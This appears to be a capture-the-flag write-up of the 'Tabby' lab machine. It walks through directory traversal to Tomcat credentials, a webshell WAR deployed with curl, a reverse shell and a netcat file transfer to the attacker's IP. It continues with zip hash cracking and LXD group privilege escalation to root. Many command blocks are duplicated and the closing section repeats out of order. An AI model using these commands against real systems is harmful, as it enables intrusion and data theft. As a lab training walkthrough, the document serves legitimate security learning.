Tabby

Tabby

Browse to the web application on port 80 to find the following webpage:

The hostname is megahosting.htb according to the email.

The news.php file includes a file called statement:

Checking for directory traversal works successfully:

I am unable to retrieve the files of ash user.

When poking around, I notice the port 8080 is running Tomcat 9. Googling for the locations of credentials led me to this post. One of the comment suggested the following location:

/usr/share/tomcat9/etc/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml

Viewing the tomcat-users.xml file led me to the following credentials:

As shown in the image above, the obtained credentials are tomcat:$3cureP4s5w0rd123!.

Using the credentials obtained from the tomcat-users.xml file, I gained access to the Tomcat application:

However, I am unable to deploy WAR files as the manager is blocked. But I did manage to upload a malicious WAR file using the /manager/text option:

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ cp /usr/share/webshells/laudanum/jsp/cmd.war .

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ curl --upload-file cmd.war -u 'tomcat:$3cureP4s5w0rd123!' "http://megahosting.htb:8080/manager/text/deploy?path=/monshell"
OK - Deployed application at context path [/monshell]
┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ cp /usr/share/webshells/laudanum/jsp/cmd.war .

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ curl --upload-file cmd.war -u 'tomcat:$3cureP4s5w0rd123!' "http://megahosting.htb:8080/manager/text/deploy?path=/monshell"
OK - Deployed application at context path [/monshell]

Using the uploaded webshell, I can issue RCE:

Start a listener on port 443. Then use the webshell to issue a busybox reverse shell to obtain an initial access on the machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ nc -lvnp 443         
listening on [any] 443 ...
connect to [10.10.14.101] from (UNKNOWN) [10.129.1.20] 36714
whoami
tomcat

whereis python
python: /usr/bin/python3.8 /usr/lib/python2.7 /usr/lib/python3.8 /etc/python3.8 /usr/local/lib/python3.8

python3 -c 'import pty; pty.spawn("/bin/bash");'
tomcat@tabby:/var/lib/tomcat9$ 

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ nc -lvnp 443         
listening on [any] 443 ...
connect to [10.10.14.101] from (UNKNOWN) [10.129.1.20] 36714
whoami
tomcat

whereis python
python: /usr/bin/python3.8 /usr/lib/python2.7 /usr/lib/python3.8 /etc/python3.8 /usr/local/lib/python3.8

python3 -c 'import pty; pty.spawn("/bin/bash");'
tomcat@tabby:/var/lib/tomcat9$

Earlier, I found an interesting directory called files on port 80 but I was unable to enumerate further. Viewing the /var/www/html directory lead me to this directory where a ZIP file exists:

tomcat@tabby:/var/www/html/files$ ls -la
ls -la
total 36
drwxr-xr-x 4 ash  ash  4096 Aug 19  2021 .
drwxr-xr-x 4 root root 4096 Aug 19  2021 ..
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Aug 19  2021 archive
drwxr-xr-x 2 root root 4096 Aug 19  2021 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16  2020 statement
tomcat@tabby:/var/www/html/files$ 

tomcat@tabby:/var/www/html/files$ nc -w 3 10.10.14.101 1234 < 16162020_backup.zip
<es$ nc -w 3 10.10.14.101 1234 < 16162020_backup.zip
tomcat@tabby:/var/www/html/files

.....SNIP.....

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ nc -l -p 1234 > 16162020_backup.zip
tomcat@tabby:/var/www/html/files$ ls -la
ls -la
total 36
drwxr-xr-x 4 ash  ash  4096 Aug 19  2021 .
drwxr-xr-x 4 root root 4096 Aug 19  2021 ..
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Aug 19  2021 archive
drwxr-xr-x 2 root root 4096 Aug 19  2021 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16  2020 statement
tomcat@tabby:/var/www/html/files$ 

tomcat@tabby:/var/www/html/files$ nc -w 3 10.10.14.101 1234 < 16162020_backup.zip
<es$ nc -w 3 10.10.14.101 1234 < 16162020_backup.zip
tomcat@tabby:/var/www/html/files

.....SNIP.....

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ nc -l -p 1234 > 16162020_backup.zip

I extracted the hash from the ZIP file and obtained the password admin@it:

┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ zip2john 16162020_backup.zip > hash.txt
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:02 DONE (2026-02-20 15:34) 0.4310g/s 4464Kp/s 4464Kc/s 4464KC/s adornadis..adj071007
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~/Desktop/Labs/Tabby]
└─$ zip2john 16162020_backup.zip > hash.txt
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8

└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:02 DONE (2026-02-20 15:34) 0.4310g/s 4464Kp/s 4464Kc/s 4464KC/s adornadis..adj071007

Although I didn't find anything interesting, I noticed the same password is reused by the user ash:

tomcat@tabby:/var/www/html/files$ su ash
su ash
Password: admin@it

ash@tabby:/var/www/html/files$
tomcat@tabby:/var/www/html/files$ su ash
su ash
Password: admin@it

ash@tabby:/var/www/html/files$

The user.txt flag:

ash@tabby:/home$ cd ash
cd ash
ash@tabby:~$ ls -la
ls -la
total 28
drwxr-x--- 3 ash  ash  4096 Aug 19  2021 .
drwxr-xr-x 3 root root 4096 Aug 19  2021 ..
lrwxrwxrwx 1 root root    9 May 21  2020 .bash_history -> /dev/null
-rw-r----- 1 ash  ash   220 Feb 25  2020 .bash_logout
-rw-r----- 1 ash  ash  3771 Feb 25  2020 .bashrc
drwx------ 2 ash  ash  4096 Aug 19  2021 .cache
-rw-r----- 1 ash  ash   807 Feb 25  2020 .profile
-r-------- 1 ash  ash    33 Feb 20 19:22 user.txt
ash@tabby:~$ cat user.txt
cat user.txt
e43f6d273e983c1710732dbeac756cd7
ash@tabby:/home$ cd ash
cd ash
ash@tabby:~$ ls -la
ls -la
total 28
drwxr-x--- 3 ash  ash  4096 Aug 19  2021 .
drwxr-xr-x 3 root root 4096 Aug 19  2021 ..
lrwxrwxrwx 1 root root    9 May 21  2020 .bash_history -> /dev/null
-rw-r----- 1 ash  ash   220 Feb 25  2020 .bash_logout
-rw-r----- 1 ash  ash  3771 Feb 25  2020 .bashrc
drwx------ 2 ash  ash  4096 Aug 19  2021 .cache
-rw-r----- 1 ash  ash   807 Feb 25  2020 .profile
-r-------- 1 ash  ash    33 Feb 20 19:22 user.txt
ash@tabby:~$ cat user.txt
cat user.txt
e43f6d273e983c1710732dbeac756cd7

Our user ash belongs to interesting groups such as adm and lxd:

ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:~$
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:~$

We can escalate privileges on the box using the lxd group. More on this is available here. It wasn't smooth either as I had to initialise the lxd environment, but the root flag is shown below:

ash@tabby:~$ lxc image import ./shii.tar.gz --alias myimage
lxc image import ./shii.tar.gz --alias myimage
ash@tabby:~$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| myimage | 21986baf1a62 | no     | alpine v3.23 (20260220_15:51) | x86_64       | CONTAINER | 3.92MB | Feb 20, 2026 at 9:01pm (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
ash@tabby:~$ lxc init myimage ignite -c security.privileged=true
lxc init myimage ignite -c security.privileged=true
Creating ignite
Error: No storage pool found. Please create a new storage pool
ash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Error: Not Found
ash@tabby:~$ 

ash@tabby:~$ lxc start ignite
lxc start ignite
Error: Not Found
ash@tabby:~$ 

ash@tabby:~$ lxc init myimage ignite -c security.privileged=true
lxc init myimage ignite -c security.privileged=true
Creating ignite
Error: No storage pool found. Please create a new storage pool
ash@tabby:~$ lxd init
lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: n
n
Do you want to configure a new storage pool? (yes/no) [default=yes]: y
y
Name of the new storage pool [default=default]: pool
pool
Name of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]: btrfs
btrfs
Create a new BTRFS pool? (yes/no) [default=yes]: yes
yes
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: no
no
Size in GB of the new loop device (1GB minimum) [default=5GB]: .5
.5
Invalid input: strconv.ParseInt: parsing ".5": invalid syntax

Size in GB of the new loop device (1GB minimum) [default=5GB]: 1
1
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
no
Would you like to create a new local network bridge? (yes/no) [default=yes]: yes
yes
What should the new bridge be called? [default=lxdbr0]: yes
yes
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
auto
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
auto
Would you like the LXD server to be available over the network? (yes/no) [default=no]: no
no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] yes
yes
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
no
ash@tabby:~$ lxc init myimage ignite -c security.privileged=true
lxc init myimage ignite -c security.privileged=true
Creating ignite
ash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
ash@tabby:~$ lxc start ignite
lxc start ignite
ash@tabby:~$ lxc exec ignite /bin/sh
lxc exec ignite /bin/sh
~ # ^[[48;5Rcd /mnt/root
cd /mnt/root
/mnt/root # ^[[48;13Rls

cdrom       lib         lost+found  proc        snap        usr
dev         lib32       media       root        srv         var

cd /root

ls -la
total 4
drwx------    1 root     root            24 Feb 20 21:05 .
drwxr-xr-x    1 root     root           114 Feb 20 21:05 ..
-rw-------    1 root     root            35 Feb 20 21:05 .ash_history
~ # cat .bash_history
cat .bash_history
cat: can't open '.bash_history': No such file or directory

cat .ash_history
cd /mnt/root
ls
cd /root
ls
ls -la
cat .bash_history
cat .ash_history
~ # ^[[48;5Rcd ..
cd ..
/ # ^[[48;5Rls -la

What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
auto
Would you like the LXD server to be available over the network? (yes/no) [default=no]: no
no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] yes
yes
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
no
ash@tabby:~$ lxc init myimage ignite -c security.privileged=true
lxc init myimage ignite -c security.privileged=true
Creating ignite
ash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
ash@tabby:~$ lxc start ignite
lxc start ignite
ash@tabby:~$ lxc exec ignite /bin/sh
lxc exec ignite /bin/sh
